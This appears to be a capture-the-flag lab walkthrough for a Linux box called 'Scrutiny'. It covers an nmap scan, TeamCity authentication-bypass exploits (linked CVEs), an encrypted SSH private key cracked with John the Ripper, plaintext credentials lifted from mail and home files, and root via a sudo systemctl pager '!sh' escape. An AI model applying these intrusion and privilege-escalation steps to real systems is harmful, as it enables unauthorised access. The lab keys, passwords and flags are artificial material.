# Linux - Scrutiny

---

### Host Info

```bash
192.168.136.91
```

### Scan

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-16 19:01 EST
Nmap scan report for 192.168.136.91
Host is up (0.039s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT    STATE  SERVICE VERSION

22/tcp  open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)

25/tcp  open   smtp    Postfix smtpd
| ssl-cert: Subject: commonName=onlyrands.com
| Subject Alternative Name: DNS:onlyrands.com
| Not valid before: 2024-06-07T09:33:24
|_Not valid after:  2034-06-05T09:33:24
|_smtp-commands: onlyrands.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-date: TLS randomness does not represent time

80/tcp  open   http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: OnlyRands

443/tcp closed https

Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 (92%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host:  onlyrands.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   35.31 ms 192.168.45.1
2   35.34 ms 192.168.45.254
3   35.35 ms 192.168.251.1
4   43.15 ms 192.168.136.91

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 154.62 seconds

```

---

## Walkthrough

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image.png)

- go to website, we find a login choice.  however, we got error says unknown host.

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%201.png)

- add target ip with host in “/etc/hosts”.

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%202.png)

- refresh page, we got a login page.

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%203.png)

- try default credential, not working.
- search “teamcity 2023.05.4 exploit”. There’s msf exploit, skip that for now.

https://www.rapid7.com/db/modules/exploit/multi/http/jetbrains_teamcity_rce_cve_2023_42793/

- attempt #1

https://www.exploit-db.com/exploits/51884

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%204.png)

- failed try another

- attempt #2

[https://github.com/H454NSec/CVE-2023-42793](https://github.com/H454NSec/CVE-2023-42793)

https://nvd.nist.gov/vuln/detail/cve-2023-42793

- attempt #3

[https://github.com/Chocapikk/CVE-2024-27198](https://github.com/Chocapikk/CVE-2024-27198)

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%205.png)

```bash
[+] User created successfully. Username: ia2xnq9s, ID: 21, Password: OEskzn5CnF
[+] Token created successfully for user ID: 21. Token Name: uuhald24dp, Token: 
eyJ0eXAiOiAiVENWMiJ9.MWlGaHhFbm5vd2NpTGg1bmUtNFYxRjF0aFNn.NmMyMzc3YjgtZDI4NC00ZDQwLTgzNTktY2Y5ZmZjOTNlYTJi
```

- we are in.

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%206.png)

- macro tillman info
    
    ![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%207.png)
    
    ```bash
    -----BEGIN OPENSSH PRIVATE KEY-----
    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
    9EHV94yVIeYQzmagUFXqPqFVMSM=
    -----END OPENSSH PRIVATE KEY-----
    
    ```
    
- use id_rsa direct connect not working, passwords required.
- this id_rsa might be encrypted. we convert it to john-recognized hash format, then decrypt it with john the ripper.

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%208.png)

- try ssh, now we are in!

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%209.png)

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%2010.png)

```bash
marcot@onlyrands:/home$ find / -perm -u+s 2>/dev/null
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/at
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
```

- [lps.sh](http://lps.sh) → not working

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%2011.png)

93aa33cefa78b5376aee26389d530614

- Remember we have a port 25 open for smtp. We should check any information contained in emails.

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%2012.png)

- as marcot, we can only read marcot.

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%2013.png)

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%2014.png)

- From matthew to macro. got credential → `matthewa : IdealismEngineAshen476`
- switch account → `matthewa`

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%2015.png)

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%2016.png)

- nothing in matthew’s email, return back to home to check

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%2017.png)

- got new password →  `briand : RefriedScabbedWasting502`
- login as briand, we are administration, we can use “sudo -l”

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%2018.png)

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%2019.png)

- allow to use command without passwd → sudo /usr/bin/systemctl status teamcity-server.service
- run → use “!” → use “!sh”.

![image.png](Linux%20-%20Scrutiny%2017d553bebf0f80809fc7fda49e51ea21/image%2020.png)

- we are root

c30feadf4d324b10234e0be04e678d08